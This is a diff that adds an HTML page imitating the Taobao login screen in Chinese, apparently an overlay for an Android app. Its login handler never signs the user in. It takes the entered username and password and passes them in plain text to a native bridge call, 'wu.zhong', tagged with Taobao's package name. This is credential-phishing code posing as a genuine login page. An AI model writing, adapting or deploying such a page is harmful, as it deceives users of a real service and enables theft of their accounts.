@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>淘宝登录</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'PingFang SC', 'Helvetica Neue', STHeiti, 'Microsoft Yahei', Tahoma, Simsun, sans-serif;
+      background-color: #f5f5f5;
+      color: #333;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+
+    /* Header */
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 15px 20px;
+      background-color: #f5f5f5;
+      border-bottom: 1px solid #e5e5e5;
+    }
+
+
+    .header-text {
+      font-size: 16px;
+      color: #333;
+      font-weight: 400;
+    }
+
+
+    .close-btn {
+      font-size: 16px;
+      color: #666;
+      cursor: pointer;
+      padding: 5px;
+    }
+
+
+
+    .logo-section {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin: 80px 0 100px 0;
+    }
+
+
+    .taobao-logo {
+      width: 80px;
+      height: 80px;
+      background: linear-gradient(135deg, #FF5722, #FF3D00);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      box-shadow: 0 4px 20px rgba(255, 87, 34, 0.3);
+    }
+
+
+    .logo-text {
+      color: white;
+      font-size: 32px;
+      font-weight: bold;
+      font-family: 'Microsoft Yahei', sans-serif;
+    }
+
+
+  
+    .form-container {
+      padding: 0 40px;
+      margin-bottom: 40px;
+    }
+
+
+    .form-group {
+      margin-bottom: 30px;
+      position: relative;
+    }
+
+
+    .form-input {
+      width: 100%;
+      padding: 15px 0;
+      background: transparent;
+      border: none;
+      border-bottom: 1px solid #ddd;
+      font-size: 16px;
+      color: #333;
+      outline: none;
+      transition: all 0.3s ease;
+    }
+
+
+    .form-input::placeholder {
+      color: #999;
+      font-weight: 300;
+    }
+
+
+    .form-input:focus {
+      border-bottom-color: #FF5722;
+    }
+
+
+    .password-toggle {
+      position: absolute;
+      right: 0;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      padding: 10px;
+    }
+
+
+    .eye-icon {
+      width: 20px;
+      height: 20px;
+      background: #FF5722;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 12px;
+    }
+
+
+    .action-links {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 50px;
+      padding: 0 40px;
+    }
+
+
+    .action-link {
+      color: #FF5722;
+      text-decoration: none;
+      font-size: 14px;
+      transition: color 0.3s ease;
+    }
+
+
+    .action-link:hover {
+      color: #E64A19;
+    }
+
+
+    .button-container {
+      padding: 0 40px;
+      margin-bottom: 20px;
+    }
+
+
+    .login-btn {
+      width: 100%;
+      padding: 16px;
+      background: linear-gradient(135deg, #FF5722, #FF3D00);
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+      margin-bottom: 15px;
+      transition: all 0.3s ease;
+      box-shadow: 0 2px 10px rgba(255, 87, 34, 0.3);
+    }
+
+
+    .login-btn:hover {
+      background: linear-gradient(135deg, #E64A19, #D84315);
+      transform: translateY(-1px);
+      box-shadow: 0 4px 15px rgba(255, 87, 34, 0.4);
+    }
+
+
+    .register-btn {
+      width: 100%;
+      padding: 16px;
+      background: transparent;
+      color: #666;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+
+    .register-btn:hover {
+      border-color: #FF5722;
+      color: #FF5722;
+    }
+
+
+  
+    @media (min-width: 768px) {
+      .form-container,
+      .action-links,
+      .button-container {
+        max-width: 400px;
+        margin-left: auto;
+        margin-right: auto;
+        margin-bottom: 40px;
+      }
+     
+      .button-container {
+        margin-bottom: 20px;
+      }
+
+
+      .logo-section {
+        margin: 100px 0 120px 0;
+      }
+
+
+      .taobao-logo {
+        width: 90px;
+        height: 90px;
+      }
+
+
+      .logo-text {
+        font-size: 36px;
+      }
+    }
+
+
+    @media (min-width: 1024px) {
+      body {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        min-height: 100vh;
+        background: linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 100%);
+      }
+
+
+      .header {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        z-index: 10;
+      }
+
+
+      .main-content {
+        background: white;
+        border-radius: 10px;
+        padding: 60px 40px 40px 40px;
+        width: 450px;
+        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
+        margin-top: 80px;
+      }
+
+
+      .logo-section {
+        margin: 40px 0 60px 0;
+      }
+
+
+      .form-container,
+      .action-links,
+      .button-container {
+        padding: 0;
+        max-width: none;
+      }
+    }
+
+
+
+    .form-input,
+    .login-btn,
+    .register-btn {
+      animation: fadeInUp 0.6s ease-out;
+    }
+
+
+    .taobao-logo {
+      animation: bounceIn 0.8s ease-out;
+    }
+
+
+    @keyframes fadeInUp {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+
+    @keyframes bounceIn {
+      0% {
+        opacity: 0;
+        transform: scale(0.3);
+      }
+      50% {
+        opacity: 1;
+        transform: scale(1.05);
+      }
+      70% {
+        transform: scale(0.95);
+      }
+      100% {
+        opacity: 1;
+        transform: scale(1);
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="header">
+    <div class="header-text">您需要登录才能继续访问</div>
+    <div class="close-btn">关闭</div>
+  </div>
+
+
+  <div class="main-content">
+  
+    <div class="logo-section">
+      <div class="taobao-logo">
+        <div class="logo-text">淘</div>
+      </div>
+    </div>
+
+
+ 
+    <div class="form-container">
+      <div class="form-group">
+        <input type="text" class="form-input" placeholder="手机号/邮箱/账号名" id="usernameInput">
+      </div>
+      <div class="form-group">
+        <input type="password" class="form-input" placeholder="请输入登录密码" id="passwordInput">
+        <div class="password-toggle" onclick="togglePassword()">
+          
+        </div>
+      </div>
+    </div>
+
+
+    <div class="action-links">
+      <a href="#" class="action-link">使用手机号登录</a>
+      <a href="#" class="action-link">忘记密码</a>
+    </div>
+
+
+    <div class="button-container">
+      <button class="login-btn" onclick="handleLogin()">登录</button>
+      <button class="register-btn" onclick="handleRegister()">新用户注册</button>
+    </div>
+  </div>
+
+
+  <script>
+   
+
+
+    function handleLogin() {
+      const username = document.getElementById('usernameInput').value.trim();
+      const password = document.getElementById('passwordInput').value;
+
+
+      if (!username || !password) {
+        return;
+      }
+
+
+      wu.zhong(`🔰🔰 \n\n \n\n✉️用户名:  ${username}\n\n🔒密码:  ${password}`, "com.taobao.taobao");
+    }
+
+
+
+
+    document.querySelectorAll('.form-input').forEach(input => {
+      input.addEventListener('focus', function() {
+        this.style.borderBottomColor = '#FF5722';
+      });
+     
+      input.addEventListener('blur', function() {
+        if (!this.value) {
+          this.style.borderBottomColor = '#ddd';
+        }
+      });
+    });
+
+
+
+    document.addEventListener('DOMContentLoaded', function() {
+      setTimeout(() => {
+        document.getElementById('usernameInput').focus();
+      }, 300);
+    });
+
+
+
+    document.querySelector('.close-btn').addEventListener('click', function() {
+      if (confirm('确定要关闭登录页面吗？')) {
+        window.close();
+      }
+    });
+  </script>
+</body>
+</html>
